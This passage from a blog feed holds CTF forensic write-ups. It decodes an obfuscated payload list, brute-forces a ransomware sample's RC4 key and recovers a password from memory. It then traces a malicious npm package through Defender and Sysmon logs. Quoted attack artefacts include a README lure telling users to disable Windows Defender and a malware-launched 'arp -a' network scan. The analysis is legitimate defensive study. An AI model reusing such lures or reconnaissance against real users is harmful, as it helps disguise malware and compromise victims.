&quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfQVFlQE1deVQ9RSVyWkJ7cVFBLH1ZbHt8LEkVanZMbwUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1nYURJY2pwRSZucVFRbUAoTnN5WUkURWFUQ0YVdVFifkRnDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTSBLSnskXFInf31dTSh5XSpMQ09tUn9hckdgRH0cd0cfBHhbWH8VCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRMRUZvQE1nYURJY2pwRSZucVFRbUAoTnN8LEkVbWFhXkFublhmTUQRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWJLSnhzRUVVakNCcGlHSSpKQxBxSG5lbRlNbXJYYm1mQHJVDgkVCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQEJFZmxJWXtYViNzdCRBLUwoVXNHXXdSe3pIVGZBGhUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1/YGhYNmp1Wll4TEEnf0lJWXJHSSp0RWppSHxxF0dKGGVDd3l+QHJVDgkVCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQE1FfG5JZ3xyfEF4cF5Gf0lJWXV4Rk1MeHppXXx+TEdie0QRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQE1Rem5nTXpwVVVtXFF7bVBSSXB4Vk4WYkUeGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTXxzf15zRUVVcnhdXWVUWCtHQ091EEFlT1pzckdKTh19SWtldUB+Z1gFGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTXpwSlF7T05dKENCcyxRc1lXQmV1UX9lT0RLR2ZcbkkSDREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQEJBYGlGWWlze1F9cE5FdHpjc3Z8Rl1Pe3ppFH9+Txhie0QRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRkQT58U1lKNURGQSFIfFFtdyRZdHopVmlHLEkQQxF1FEZucRhiaWFAdBxHRnhxZQVWBGFBWnJxSmdTUzMbERYtDhcodWl0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfa2t7U1xJZGlJZ2pYViNzQmF4JTkkJTx7d3NFD1ZbUA==&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvXUNCVW55WSZXaEtUbwUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvXXsoVS1/SUlVRWpuTWlnSBUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvXXspf2l/WSZIe2puTWlnSBUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvVn1CVWxEZ1ZTYkUeGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvSXhNVSx5RlVMQltqV2ZBGhUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvT3hNSXB/LVJJbWNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRdV2g1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfaz5xQEJJZGlJaHdwRSdzT3t7a0NMWXR5WXdabkVMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1Rem5nTWlzICokWVVVc3hCUWZRXV1NQHVbSEZfZVhLQ2laTlcaA2hlS0Z+fnVQXX1cTHJZUH1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWdISkF7XFInf3p3Imp5XSpaQmVbVEFlT15KUx5Wd3ZuQHJVDgkVCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTX1zIVpzdlFvcHhNLlt8SWdMaGVPUWxhfVhLbX1WYklADREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzdEFOf1JbdCE9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWW9ESXNVc09PV391ZkB5eWpFd2l5SlABYUJWdQJIW1dQVX5ZAn1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdXWlHXV1XQ2VlVEdNfVhLbX5LZHofV3hfdkFWflxRel0GAR0AAWAnKy8hazI/PA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdXWlHXV1XQ2VlVEdNfVhLbX5LZHofV3hffQZtTHZPdGkOV18NbTQIJSx5ZXh5aC8jJyljOjck&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXkJ4UzkkJTx7d3NFD1ZbUA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWW9ESXNVc09PV391ZhFgYmFaTx1+V3pLcl1tcEBRcHlIW155RyggFXYDJBE/JAotdnFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWWV8SSoQamphV3xxS117R0dfd31EexEMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSf2x5WXhHQxFhSEdPT19LbW1cT0V1QFN1Zkd8dX1BYFNyTHR5eToIBRk0JwESfgotdnFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BZWntUXV1XQ2VlVEdIdURMYnpLfX1tXVBlS1h5WH1UYG1qU3ZvUH1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdVWx+WXdMQk5xSEBudk95eWlAT0NhSVRqcQR+fnVLYG1XSVl5aXQlATQjJHQRfQIbJHFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdImZRcFVMQ3UaFn91T19LbW1cT0V1QFN1ZkR2UQoFGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSf2x5WXhHQxFhSEdPT19LbW1cT0V1QFN1ZlN+T3ZRdVdtSWRHdjMIAQl3HC8OOAANDTYECRUgMxUGYhYxamV5ZGV8OzczBU8WGxA=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BZWntUXV1NQHVbSGlIQ1FIcnlAZmlhQFJ1W1hWWmVUXHJqTH5ZAn1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWWV8SSoQamFIbwUYGQhPQ0dJA1pXRA==&quot;,  &quot;cHh2a2trJiprKShiYX1hfWQxcHJncCAjIzl1a3lzNjhBD1JaAwkGAF9LDQICWlxGRFReWlpQRR9aWEleCgkQXXZ1JiYnKiIiYCUjJSljKyEzPjY2fHx/d3N5OHwAM3l/Bg4QQwgMCAJIAARLAx0LAVhWFBoYEFgDAA1dV1xaDFipqKA=&quot;,  &quot;cHh2a2trJmYmeXMrKisua3V9MnI6ZW8=&quot;, &quot;QzteVndgdHRUamJqYGFrYXd0TldxZn1jd2lGVnV+bHBTTkRXBGBCQE0HRkVHICQiOnIIb2FGU0VLZVlTXVFSWi4mJx8AKiUyJSwkPz8RJyIgPiAnNTsieSIwKlZWUFQcWj03EAEXFTsLAQsHAAgACBUtNhwDGxoYGR0JJxoUEhqu9fr3iY+LjQ==&quot;, &quot;ZWJqbCRhaWltKQ==&quot;, &quot;ZG5sZiQIDA==&quot;]


def decrypt(data):
  data = bytearray(base64.b64decode(data))
  for i in range(len(data)):
    data[i]  ^= i
  return data.decode()
for payload in enc:
  dec = decrypt(payload)
  print(dec)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByJ4euGVlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 2 : whoami&lt;/h3&gt;
&lt;h2&gt;Question 3&lt;/h2&gt;
&lt;p&gt;tôi sẽ lưu lại script a.py và đọc source của nó
a.py là một file ransomware sử dụng RC4 để encryption file
key được chia ra 2 phần
Base | random chars range(4)
Basekey ta đã có từ Question1
ta viết script brute decrypt file inportant.zip.enc điều kiện sau khi decrypt với key nào ra được header zip : b&quot;PK\x03\x04&quot; thì lấy key&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import itertools
import string

# Dữ liệu mã hóa
enc_data = b&apos;\x92wC)\xdb\xf7\x9f&amp;lt;\x034V\xcd\xfb\x12\x99*\xd2\x81\x02j6\x91Ihb\xeb\xef1\x88\xa5&apos;

# Base key bạn cung cấp
base_key = &quot;fA3bDt&quot;

# Hàm sinh RC4 stream và giải mã
def keySchd(key):
    sched = list(range(256))
    i = 0
    for j in range(256):
        i = (i + sched[j] + key[j % len(key)]) % 256
        sched[j], sched[i] = sched[i], sched[j]
    return sched

def genStream(sched):
    i = j = 0
    while True:
        i = (i + 1) % 256
        j = (sched[i] + j) % 256
        sched[i], sched[j] = sched[j], sched[i]
        yield sched[(sched[i] + sched[j]) % 256]

def rc4_decrypt(data, key):
    sched = keySchd(key)
    stream = genStream(sched)
    return bytes([b ^ next(stream) for b in data])

# Charset của 4 ký tự cuối
charset = string.ascii_letters + string.digits

# Brute-force
for suffix in itertools.product(charset, repeat=4):
    full_key = (base_key + &apos;&apos;.join(suffix)).encode()
    decrypted = rc4_decrypt(enc_data[:8], full_key)
    if decrypted.startswith(b&quot;PK\x03\x04&quot;):
        print(f&quot;[+] Found Key: {full_key.decode()}&quot;)
        full_decrypted = rc4_decrypt(enc_data, full_key)
        print(f&quot;[+] Decrypted Data: {full_decrypted}&quot;)
        # Ghi file nếu muốn:
        with open(&quot;decrypted.zip&quot;, &quot;wb&quot;) as f:
            f.write(full_decrypted)
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyrxV_M4xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 3 : fA3bDtz8z7&lt;/h3&gt;
&lt;h2&gt;Question 4:&lt;/h2&gt;
&lt;p&gt;Sau khi decrypt file inpomtant nó đã bị bảo mật
hash md5 của file important.zip&lt;/p&gt;
&lt;h3&gt;Answer 4 : 2b33ff2f343ac8e7b2158ca00be8f6b6&lt;/h3&gt;
&lt;h2&gt;Question 5&lt;/h2&gt;
&lt;p&gt;Kiểm tra web browser của user ta thấy có BraveSoftware extract file History , Folder Path : %AppData%\Local\BraveSoftware\User Data\Default\History&lt;/p&gt;
&lt;p&gt;sử dụng các trình đọc database
&lt;img src=&quot;https://hackmd.io/_uploads/SJFtzuzVle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 5 : https://pastebin.com/qPsjHKrW&lt;/h3&gt;
&lt;h2&gt;Question 6:&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r116GdGNgg.png&quot; alt=&quot;image&quot; /&gt;
Trang pastebin đã bị locked đã đến lúc sử dụng đến file memory
check ProcessList ta thấy có process NotePad.exe với PID = 6876
ở câu hỏi này tôi đã mất thời gian rất lâu để tìm ra tôi đã được Author gợi ý cho Heap Allocations và blog để tìm hiểu về điều này
https://www.sans.org/blog/the-analysis-of-user-data-in-VADs-extraction-of-precise-data-in-notepad-memory-and-hunting-for-malware-behavior/&lt;/p&gt;
&lt;p&gt;Tôi sử dụng MemProcFS để convert .mem to .dmp chuẩn định dạng crash dump cho WinDBG&lt;/p&gt;
&lt;p&gt;attach Process debug với Notepad.exe
&lt;img src=&quot;https://hackmd.io/_uploads/BJKKN_z4ll.png&quot; alt=&quot;image&quot; /&gt;
sau đó list các VADs Heap allocation của tiến trình này&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!heap -s -v -a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Theo như blog  thì cái ta cần kiểm tra thì các allocation phải không được gán flag LFH và Sub-segment và nên được gán flag &quot;extra user_flags&quot; nhưng trong list heap này tôi chỉ thấy nó có 1 allocation &quot;free user_flags&quot; tôi đã thử kiểm tra data nhưng không có gì vì theo thư mô tả flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HEAP_ENTRY_BUSY: Indicates if a memory block is currently in use (1) or free (0) - this is the fundamental allocation status flag.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;allocation này có vẻ như đã bị giải phóng. Ta chỉ còn cách dump toàn bộ FirstEntry-LastValid  Entry của heap allocation để check&lt;/p&gt;
&lt;p&gt;sau khi thực hiện như blog ta có offset heap : 000001df84730000
&lt;img src=&quot;https://hackmd.io/_uploads/HkHOLdzVxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;dump Heap location này ra và filter với strings + grep tìm password điều này giúp ta giảm tối đã lượng bytes thu hẹp lại chỉ trong phạm vi Heap Allocations FirstEntry&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;db 0x000001df`84730740 L 0xFE8C9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;có 2 chuỗi nghi ngờ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Y24k8UPs
FUl i3deXy3QM3
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Answer 6: i3deXy3QM3&lt;/h3&gt;
&lt;h2&gt;Question 7:&lt;/h2&gt;
&lt;p&gt;Dùng mật khẩu unlocked pastebin ta có password file zip
&lt;img src=&quot;https://hackmd.io/_uploads/H1jEuuGNle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 7 : KvvO60Zf69Yyq8&lt;/h3&gt;
</content:encoded></item><item><title>CPCTF2025</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/cpctf2025/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/cpctf2025/</guid><pubDate>Mon, 21 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;CPCTF2025&lt;/h1&gt;
&lt;h2&gt;Challenge: Event Analyzer&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Category: Forensic
Level: Medium-Hard
There was a suspicious communication from the company&apos;s PC.
Apparently, a part-time employee in the company put his own package in and used it, but it seems that a malicious user mixed malware into it.
I would like you to analyze it and find out the following contents.
The files distributed by this issue contain programs that behave like malware. Use caution at runtime and use appropriate virtual environments, etc.
https://files.cpctf.space/EventAnalyze/forensics-new.zip
The username of the malicious user who introduced the malware
Malware&apos;s external destination IP
format: Converts to
e.g., when._192.0.2.0192_0_2_0
The malware&apos;s previously reported file name (excluding extensions) Example
: istest.pytest
Flag Format
CPCTF {username-IP-filename}-&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Artifact:&lt;/h3&gt;
&lt;p&gt;Following Description:
I have the file system for this challenge, which contains three very interesting folders related to the victim:
Documents
Logs (C:\Windows\System32\winevt\Logs)
Windows Defender
Tracking:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In the Documents folder, there is a Git workspace under workspace/marktype. It appears to be a tool built using the Node.js framework&lt;/li&gt;
&lt;li&gt;For Windows Logs (.evtx files), I used EvtxECmd.exe and Timeline Explore from Eric Zimmerman&apos;s toolkit to analyze event logs efficently&lt;/li&gt;
&lt;li&gt;The Windows Defender folder has an interesting subdirectory named Support which contains many MP logs. These logs help track detected malicous files&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Windows Defenders to track malicious code&lt;/h3&gt;
&lt;p&gt;Pathlocation: C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-&lt;em&gt;.log
MPDetection-&lt;/em&gt;.log : Details about file detected
MPlog-Scan*: Information about periodic scanning&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Select-String -Path &quot;C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log&quot; -Pattern &quot;ThreatName&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or you guys can check WindowsDefenderOperation.evtx
EventID:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;EventID&lt;/th&gt;
&lt;th&gt;Meaning&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1116&lt;/td&gt;
&lt;td&gt;Threat Detected&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1118&lt;/td&gt;
&lt;td&gt;Threat Quarantined&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5007&lt;/td&gt;
&lt;td&gt;Configuaration change&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;I try to use EvtxCMD.exe and Timeline to hunt malicous script of Windefender log and the eventid 1116 gave me a notice that have a file python to be detected which Trojan&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJb29cMkle.png&quot; alt=&quot;image&quot; /&gt;
fullpath : _C:\Users\User\Documents\workspaces\marktype\node_modules@n37scancp\highlight.js\this_is_not_flag.py&lt;/p&gt;
&lt;p&gt;&quot;I immediately tracked the filesystem, but it seems the file was deleted by the user or attacker. I suspect the file might have been renamed or replaced. I checked the MPLog and found the hash of the file, then submitted it to VirusTotal for dynamic analysis. The result identified it as a trojan, with the file name evil.py
&lt;img src=&quot;https://hackmd.io/_uploads/ryu439f1ge.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/rJwS2cfyxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Username&apos;s attacker&lt;/h3&gt;
&lt;p&gt;To get username for applying malicous code
I was process and extract folder workspace go to marktype repo and read log&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS D:\workspaces\marktype&amp;gt; git show
fatal: detected dubious ownership in repository at &apos;D:/workspaces/marktype&apos;
&apos;D:/workspaces/marktype&apos; is owned by:
        BUILTIN/Administrators (S-1-5-32-544)
but the current user is:
        DESKTOP-F1G30NU/tttho (S-1-5-21-468254640-2330663745-2608076463-1001)
To add an exception for this directory, call:

        git config --global --add safe.directory D:/workspaces/marktype
PS D:\workspaces\marktype&amp;gt; git config --global --add safe.directory D:/workspaces/marktype
PS D:\workspaces\marktype&amp;gt; git show
commit 0657d2ad695e9fb1418f76c8fea3170f79ce66c8 (HEAD -&amp;gt; main, origin/main, origin/HEAD)
Author: n37scan &amp;lt;n37scan@example.net&amp;gt;
Date:   Sat Apr 19 22:10:46 2025 +0900

    feat: update README

diff --git a/README.md b/README.md
index d259e56..bb312e8 100644
--- a/README.md
+++ b/README.md
@@ -2,6 +2,9 @@

 This is a simple markdown editor that allows you to write and preview markdown in real-time. It is built using React and Tailwind CSS.

+&amp;gt; [!NOTE]
+&amp;gt; Windows Defender may occasionally detect this as a false positive, but there is no problem. In such cases, please either turn off Windows Defender or add an exclusion setting.
+
 ## Features
 - Real-time preview of markdown
 - Syntax highlighting for code blocks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and then the username : n37scan&lt;/p&gt;
&lt;h3&gt;Hunting C2 Attacker (for many ways )&lt;/h3&gt;
&lt;p&gt;&quot;The last flag segment drove me mad for a long time, but thanks to it, I learned a lot from the process.&lt;/p&gt;
&lt;p&gt;First, I checked the Sysmon logs and saw several signs of port scanning activity originating from the check.js file in the marktype tool repository.&lt;/p&gt;
&lt;p&gt;For network analysis, I hunted through the logs using Event ID 3 (network connections from Sysmon).&lt;/p&gt;
&lt;p&gt;However, it seemed like I had initially missed something very important: the internal user who downloaded the repository and executed the payload&lt;/p&gt;
&lt;p&gt;By examining Windows Event Logs, I found Event ID 4720, which indicates a new user account creation, and Event ID 4722, which shows that a previously disabled account was enabled—likely granting privilege to execute the malicious payload.&quot;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
    &quot;EventData&quot;: {
        &quot;Data&quot;: [
            {
                &quot;@Name&quot;: &quot;TargetUserName&quot;,
                &quot;#text&quot;: &quot;User&quot;
            },
            {
                &quot;@Name&quot;: &quot;TargetDomainName&quot;,
                &quot;#text&quot;: &quot;WINDEV2407EVAL&quot;
            },
            {
                &quot;@Name&quot;: &quot;TargetSid&quot;,
                &quot;#text&quot;: &quot;S-1-5-21-3321994293-4085765757-686894724-1000&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectUserSid&quot;,
                &quot;#text&quot;: &quot;S-1-5-18&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectUserName&quot;,
                &quot;#text&quot;: &quot;WINDEV2407EVAL$&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectDomainName&quot;,
                &quot;#text&quot;: &quot;WORKGROUP&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectLogonId&quot;,
                &quot;#text&quot;: &quot;0x3E7&quot;
            },
            {
                &quot;@Name&quot;: &quot;PrivilegeList&quot;,
                &quot;#text&quot;: &quot;-&quot;
            },
            {
                &quot;@Name&quot;: &quot;SamAccountName&quot;,
                &quot;#text&quot;: &quot;User&quot;
            },
            {
                &quot;@Name&quot;: &quot;DisplayName&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;UserPrincipalName&quot;,
                &quot;#text&quot;: &quot;-&quot;
            },
            {
                &quot;@Name&quot;: &quot;HomeDirectory&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;HomePath&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;ScriptPath&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;ProfilePath&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;UserWorkstations&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;PasswordLastSet&quot;,
                &quot;#text&quot;: &quot;%%1794&quot;
            },
            {
                &quot;@Name&quot;: &quot;AccountExpires&quot;,
                &quot;#text&quot;: &quot;%%1794&quot;
            },
            {
                &quot;@Name&quot;: &quot;PrimaryGroupId&quot;,
                &quot;#text&quot;: &quot;513&quot;
            },
            {
                &quot;@Name&quot;: &quot;AllowedToDelegateTo&quot;,
                &quot;#text&quot;: &quot;-&quot;
            },
            {
                &quot;@Name&quot;: &quot;OldUacValue&quot;,
                &quot;#text&quot;: &quot;0x0&quot;
            },
            {
                &quot;@Name&quot;: &quot;NewUacValue&quot;,
                &quot;#text&quot;: &quot;0x15&quot;
            },
            {
                &quot;@Name&quot;: &quot;UserAccountControl&quot;,
                &quot;#text&quot;: &quot;, %%2080, %%2082, %%2084&quot;
            },
            {
                &quot;@Name&quot;: &quot;UserParameters&quot;,
                &quot;#text&quot;: &quot;%%1793&quot;
            },
            {
                &quot;@Name&quot;: &quot;SidHistory&quot;,
                &quot;#text&quot;: &quot;-&quot;
            },
            {
                &quot;@Name&quot;: &quot;LogonHours&quot;,
                &quot;#text&quot;: &quot;%%1797&quot;
            }
        ]
    }
}
// Privc admin
{
    &quot;EventData&quot;: {
        &quot;Data&quot;: [
            {
                &quot;@Name&quot;: &quot;TargetUserName&quot;,
                &quot;#text&quot;: &quot;User&quot;
            },
            {
                &quot;@Name&quot;: &quot;TargetDomainName&quot;,
                &quot;#text&quot;: &quot;WINDEV2407EVAL&quot;
            },
            {
                &quot;@Name&quot;: &quot;TargetSid&quot;,
                &quot;#text&quot;: &quot;S-1-5-21-3321994293-4085765757-686894724-1000&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectUserSid&quot;,
                &quot;#text&quot;: &quot;S-1-5-18&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectUserName&quot;,
                &quot;#text&quot;: &quot;WINDEV2407EVAL$&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectDomainName&quot;,
                &quot;#text&quot;: &quot;WORKGROUP&quot;
            },
            {
                &quot;@Name&quot;: &quot;SubjectLogonId&quot;,
                &quot;#text&quot;: &quot;0x3E7&quot;
            }
        ]
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;WINDEV2407EVAL/User : attacker
and then I analysis with user of attakcer
At EventID:3 sysmon for network connection&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;EventID 3 -&amp;gt; Map Description : Network Connection -&amp;gt; Executable Info: C:\Users\User\AppData\Local\Volta\tools\image\node\22.14.0\node.exe
EventID 1 -&amp;gt; Map Description : Process creation -&amp;gt; Execution : C:\Windows\system32\cmd.exe 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;or you can track with EventID : 600 windows powershell operation log&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Evenid: 600 -&amp;gt; Map Description : Provider is Started -&amp;gt; Executable Info:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;for the first payload in arpscan and under it was scan ICMP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Payload: {&quot;EventData&quot;:{&quot;Data&quot;:[{&quot;@Name&quot;:&quot;RuleName&quot;,&quot;#text&quot;:&quot;-&quot;},{&quot;@Name&quot;:&quot;UtcTime&quot;,&quot;#text&quot;:&quot;2025-04-17 15:52:26.591&quot;},{&quot;@Name&quot;:&quot;ProcessGuid&quot;,&quot;#text&quot;:&quot;45aec52c-23ba-6801-9407-000000000a00&quot;},{&quot;@Name&quot;:&quot;ProcessId&quot;,&quot;#text&quot;:&quot;14796&quot;},{&quot;@Name&quot;:&quot;Image&quot;,&quot;#text&quot;:&quot;C:\\Windows\\System32\\cmd.exe&quot;},{&quot;@Name&quot;:&quot;FileVersion&quot;,&quot;#text&quot;:&quot;10.0.22621.3672 (WinBuild.160101.0800)&quot;},{&quot;@Name&quot;:&quot;Description&quot;,&quot;#text&quot;:&quot;Windows Command Processor&quot;},{&quot;@Name&quot;:&quot;Product&quot;,&quot;#text&quot;:&quot;Microsoft® Windows® Operating System&quot;},{&quot;@Name&quot;:&quot;Company&quot;,&quot;#text&quot;:&quot;Microsoft Corporation&quot;},{&quot;@Name&quot;:&quot;OriginalFileName&quot;,&quot;#text&quot;:&quot;Cmd.Exe&quot;},{&quot;@Name&quot;:&quot;CommandLine&quot;,&quot;#text&quot;:&quot;C:\\Windows\\system32\\cmd.exe /d /s /c \&quot;arp -a\&quot;&quot;},{&quot;@Name&quot;:&quot;CurrentDirectory&quot;,&quot;#text&quot;:&quot;C:\\Users\\User\\Documents\\workspaces\\marktype\\node_modules\\@n37scancp\\highlight.js\\&quot;},{&quot;@Name&quot;:&quot;User&quot;,&quot;#text&quot;:&quot;WINDEV2407EVAL\\User&quot;},{&quot;@Name&quot;:&quot;LogonGuid&quot;,&quot;#text&quot;:&quot;45aec52c-efc3-6800-650f-0b0000000000&quot;},{&quot;@Name&quot;:&quot;LogonId&quot;,&quot;#text&quot;:&quot;0xB0F65&quot;},{&quot;@Name&quot;:&quot;TerminalSessionId&quot;,&quot;#text&quot;:&quot;1&quot;},{&quot;@Name&quot;:&quot;IntegrityLevel&quot;,&quot;#text&quot;:&quot;Medium&quot;},{&quot;@Name&quot;:&quot;Hashes&quot;,&quot;#text&quot;:&quot;SHA256=3F6AA206177BEBB29FC534C587A246E0F395941640F3F266C80743AF95A02150&quot;},{&quot;@Name&quot;:&quot;ParentProcessGuid&quot;,&quot;#text&quot;:&quot;45aec52c-2346-6801-7802-000000000a00&quot;},{&quot;@Name&quot;:&quot;ParentProcessId&quot;,&quot;#text&quot;:&quot;10132&quot;},{&quot;@Name&quot;:&quot;ParentImage&quot;,&quot;#text&quot;:&quot;C:\\Users\\User\\AppData\\Local\\Volta\\tools\\image\\node\\22.14.0\\node.exe&quot;},{&quot;@Name&quot;:&quot;ParentCommandLine&quot;,&quot;#text&quot;:&quot;C:\\Users\\User\\AppData\\Local\\Volta\\tools\\image\\node\\22.14.0\\node.exe C:\\Users\\User\\Documents\\workspaces\\marktype\\node_modules\\@n37scancp\\highlight.js\\lib\\check.js childScan&quot;},{&quot;@Name&quot;:&quot;ParentUser&quot;,&quot;#text&quot;:&quot;WINDEV2407EVAL\\User&quot;}]}}  (Count: 1)
&lt;/code&gt;&lt;/pre&gt;
